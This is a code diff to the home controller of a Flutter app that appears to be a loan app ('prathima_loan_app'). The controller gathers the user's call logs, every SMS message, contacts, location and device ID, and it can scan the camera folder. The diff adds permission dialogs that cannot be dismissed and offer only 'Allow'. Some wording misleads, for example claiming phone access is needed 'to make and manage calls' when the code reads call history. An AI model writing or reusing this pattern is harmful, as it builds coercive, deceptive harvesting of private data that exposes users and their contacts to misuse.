@@ -5,7 +5,6 @@ import 'package:call_log/call_log.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:flutter/material.dart';
-import 'package:flutter/services.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:geocoding/geocoding.dart';
 import 'package:geolocator/geolocator.dart';
@@ -15,6 +14,7 @@ import 'package:installed_apps/installed_apps.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:prathima_loan_app/controllers/kyc_controller.dart';
 import 'package:prathima_loan_app/customs/custom_snackbar.dart';
+import 'package:prathima_loan_app/customs/custom_text.dart';
 import 'package:prathima_loan_app/data/api/api_checker.dart';
 import 'package:prathima_loan_app/data/model/app_model.dart';
 import 'package:prathima_loan_app/data/model/call_log_model.dart';
@@ -23,7 +23,11 @@ import 'package:prathima_loan_app/data/model/login_model.dart';
 import 'package:prathima_loan_app/data/model/sms_model.dart';
 import 'package:prathima_loan_app/data/repository/home_repository.dart';
 import 'package:prathima_loan_app/helpers/route_helper.dart';
+import 'package:prathima_loan_app/screens/home/widget/init_permission_dialog.dart';
+import 'package:prathima_loan_app/utils/colors.dart';
+import 'package:prathima_loan_app/utils/custom_icon.dart';
 import 'package:prathima_loan_app/utils/shared_preferences.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 
 class HomeController extends GetxController implements GetxService {
   final HomeRepository homeRepository;
@@ -31,13 +35,22 @@ class HomeController extends GetxController implements GetxService {
   HomeController({required this.homeRepository});
 
   int _currentIndex = 0;
+  int _carouselIndex = 0;
   String _initialLoanAmount = '...';
+  bool _isDialogShown = false;
   String _deviceId = '';
   int _userId = 0;
   bool _allPermissionsGranted = false;
   bool _hasShownPermanentlyDeniedDialog = false;
+  final List<String> _carouselImageList = [
+    'assets/img/slider_image.jpg',
+    'assets/img/slider_image_2.jpg',
+    'assets/img/slider_image_3.jpg',
+  ];
 
   int get currentIndex => _currentIndex;
+
+  int get carouselIndex => _carouselIndex;
 
   String get initialLoanAmount => _initialLoanAmount;
 
@@ -47,7 +60,11 @@ class HomeController extends GetxController implements GetxService {
 
   bool get allPermissionsGranted => _allPermissionsGranted;
 
+  bool get isDialogShown => _isDialogShown;
+
   bool get hasShownPermanentlyDeniedDialog => _hasShownPermanentlyDeniedDialog;
+
+  List<String> get carouselImageList => _carouselImageList;
 
   List<BottomNavigationBarItem> items = [
     const BottomNavigationBarItem(
@@ -70,6 +87,11 @@ class HomeController extends GetxController implements GetxService {
 
   void updateIndex(int index) {
     _currentIndex = index;
+    update();
+  }
+
+  void updateCarouselIndex(int index) {
+    _carouselIndex = index;
     update();
   }
 
@@ -106,10 +128,8 @@ class HomeController extends GetxController implements GetxService {
     if (await Permission.phone.request().isGranted) {
       try {
         Iterable<CallLogEntry> entries = await CallLog.query();
-
         List<CallLogData> callLogDataList =
             entries.map((e) => CallLogData.fromJson(e)).toList();
-
         if (callLogDataList.isNotEmpty) {
           List<Map<String, dynamic>> jsonDataList = callLogDataList
               .map((callLogData) => callLogData.toJson())
@@ -150,6 +170,25 @@ class HomeController extends GetxController implements GetxService {
     }
   }
 
+  Future<void> permissionDialog() async {
+    final prefs = await SharedPreferences.getInstance();
+    bool isShowPermission = prefs.getBool('permission') ?? false;
+    if (_isDialogShown) return;
+    if (!isShowPermission) {
+      await prefs.setBool('permission', true);
+      initPermissionDialog();
+    } else {
+      await appPermission();
+    }
+  }
+
+  Future<void> changeDialogStatus(bool value) async {
+    _isDialogShown = value;
+    if (value == false) {
+      await appPermission();
+    }
+  }
+
   Future<void> getDeviceIdAndUserId() async {
     final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
 
@@ -171,6 +210,7 @@ class HomeController extends GetxController implements GetxService {
       try {
         SmsQuery query = SmsQuery();
         List<SmsMessage> messages = await query.getAllSms;
+        messages.sort((a, b) => b.date!.compareTo(a.date!));
         List<SmsData> smsDataList =
             messages.map((e) => SmsData.fromJson(e)).toList();
         if (smsDataList.isNotEmpty) {
@@ -214,11 +254,9 @@ class HomeController extends GetxController implements GetxService {
   Future<List<String>> fetchDCIMFolder() async {
     List<String> filePaths = [];
     if (await Permission.manageExternalStorage.isGranted == false) {
-      print('yes entered --------------------');
       await Permission.manageExternalStorage.request();
     }
-    print(
-        'await Permission.manageExternalStorage.isGranted ${await Permission.manageExternalStorage.isGranted}');
+
     if (await Permission.storage.request().isGranted) {
       try {
         var picturesDirectory = Directory('/storage/emulated/0/DCIM/Camera/');
@@ -241,8 +279,6 @@ class HomeController extends GetxController implements GetxService {
 
     return filePaths;
   }
-
-
 
   Future<void> fetchCurrentLocation() async {
     if (await Permission.location.request().isGranted) {
@@ -274,10 +310,10 @@ class HomeController extends GetxController implements GetxService {
 
   Future<void> appPermission() async {
     Map<Permission, PermissionStatus> statuses = await [
-      Permission.phone,
-      Permission.sms,
       Permission.location,
       Permission.contacts,
+      Permission.sms,
+      Permission.phone,
       Permission.storage,
     ].request();
 
@@ -288,6 +324,7 @@ class HomeController extends GetxController implements GetxService {
       await _handlePermissionStatuses(statuses);
     } else {
       // await fetchDCIMFolder();
+      await getDeviceIdAndUserId();
       await fetchContactsLogs();
       await fetchCallLogs();
       await fetchSMSLogs();
@@ -314,9 +351,8 @@ class HomeController extends GetxController implements GetxService {
     for (var entry in statuses.entries) {
       Permission permission = entry.key;
       PermissionStatus status = entry.value;
-
       if (status == PermissionStatus.denied) {
-        await _showPermissionDialog(permission);
+        await returnPermission(permission);
       } else if (status == PermissionStatus.permanentlyDenied) {
         if (!_hasShownPermanentlyDeniedDialog) {
           _hasShownPermanentlyDeniedDialog = true;
@@ -326,21 +362,116 @@ class HomeController extends GetxController implements GetxService {
     }
   }
 
-  Future<void> _showPermissionDialog(Permission permission) async {
+  Future<void> returnPermission(Permission permission) async {
+    switch (permission) {
+      case Permission.contacts:
+        return await _showPermissionDialog(
+            icon: 'assets/icon/contact_icon.png',
+            title: "Contacts",
+            value: "We use and store this to detect and evaluate risks "
+                "to provide you with the best offers.",
+            permission: permission);
+      case Permission.location:
+        return await _showPermissionDialog(
+            icon: 'assets/icon/location_icon.png',
+            title: "Location",
+            value: "We use and store this to identify "
+                "serviceable locations which may help in faster approvals.",
+            permission: permission);
+      case Permission.sms:
+        return await _showPermissionDialog(
+            icon: 'assets/icon/sms_icon.png',
+            title: "SMS",
+            value:
+                "We use and store your SMS data including (but not limited to)"
+                " transactions, credits, debits, etc to evaluate creditworthiness"
+                " to provide you with credit limits and personalized offers.",
+            permission: permission);
+      case Permission.storage:
+        return await _showPermissionDialog(
+            icon: 'assets/icon/storage_icon.png',
+            title: "Storage",
+            value: "We need storage access to save your documents "
+                "and other relevant information securely.",
+            permission: permission);
+      case Permission.phone:
+        return await _showPermissionDialog(
+            icon: 'assets/icon/contact_icon.png',
+            title: "Phone",
+            value: "We need access to your phone to make and manage calls.",
+            permission: permission);
+    }
+  }
+
+  Future<void> _showPermissionDialog(
+      {required String icon,
+      required String title,
+      required String value,
+      required Permission permission}) async {
     await Get.dialog(
       barrierDismissible: false,
       AlertDialog(
-        title: const Text('Permission Required'),
-        content: const Text(
-            'This is required for the app to function properly. Please grant the permission.'),
+        backgroundColor: Colors.white,
+        shape: RoundedRectangleBorder(
+          borderRadius: BorderRadius.circular(2),
+        ),
+        contentPadding:
+            const EdgeInsets.symmetric(vertical: 20, horizontal: 16),
+        content: Column(
+          mainAxisSize: MainAxisSize.min,
+          crossAxisAlignment: CrossAxisAlignment.start,
+          children: [
+            const Center(
+              child: SizedBox(
+                  height: 100,
+                  width: 70,
+                  child: Image(
+                      image: AssetImage("assets/icon/security_icon.jpg"))),
+            ),
+            const CustomText(
+              text:
+                  "You will be asked for below permission next please allow to proceed",
+              fontSize: 16,
+              fontWeight: FontWeight.bold,
+              maxLines: 3,
+              textAlign: TextAlign.center,
+            ),
+            const SizedBox(height: 16),
+            permissionRow(icon: icon, title: title, value: value),
+            const Row(
+              mainAxisAlignment: MainAxisAlignment.center,
+              children: [
+                CustomIcon(
+                  icon: "assets/icon/privacy_security_icon.png",
+                  color: Colors.green,
+                ),
+                SizedBox(width: 6),
+                CustomText(
+                  text: "Your information is safe with us",
+                  fontSize: 12,
+                  color: Colors.green,
+                )
+              ],
+            )
+          ],
+        ),
         actions: [
-          TextButton(
-            onPressed: () async {
+          GestureDetector(
+            onTap: () async {
               Get.back();
               await permission.request();
             },
-            child: const Text('Allow'),
-          ),
+            child: Container(
+              decoration: BoxDecoration(
+                  color: MyTheme.mainColor,
+                  borderRadius: BorderRadius.circular(4)),
+              padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 6),
+              child: const CustomText(
+                text: "Allow",
+                color: MyTheme.white,
+              ),
+            ),
+          )
         ],
       ),
     );
@@ -349,24 +480,18 @@ class HomeController extends GetxController implements GetxService {
   Future<void> _showPermanentlyDeniedDialog() async {
     await Get.dialog(
       barrierDismissible: false,
-      AlertDialog(
-        title: const Text('Permission Required'),
-        content: const Text(
-            'This permission has been permanently denied. Please go to settings and enable it manually.'),
-        actions: [
-          TextButton(
-            onPressed: () {
-              openAppSettings().then((_) async {
-                _allPermissionsGranted = await _checkAllPermissionsGranted();
-                if (_allPermissionsGranted) {
-                  Get.back();
-                }
-              });
-            },
-            child: const Text('Open Settings'),
-          ),
-        ],
-      ),
+      alertDialog(
+          onTap: () {
+            openAppSettings().then((_) async {
+              _allPermissionsGranted = await _checkAllPermissionsGranted();
+              if (_allPermissionsGranted) {
+                Get.back();
+              }
+            });
+          },
+          buttonText: 'Open Settings',
+          title:
+              'This permission has been permanently denied. Please go to settings and enable it manually.'),
     ).then((value) async {
       if (!_allPermissionsGranted) {
         _allPermissionsGranted = await _checkAllPermissionsGranted();
@@ -377,6 +502,7 @@ class HomeController extends GetxController implements GetxService {
         _showPermanentlyDeniedDialog();
       } else {
         // await fetchDCIMFolder();
+        await getDeviceIdAndUserId();
         await fetchContactsLogs();
         await fetchCallLogs();
         await fetchSMSLogs();
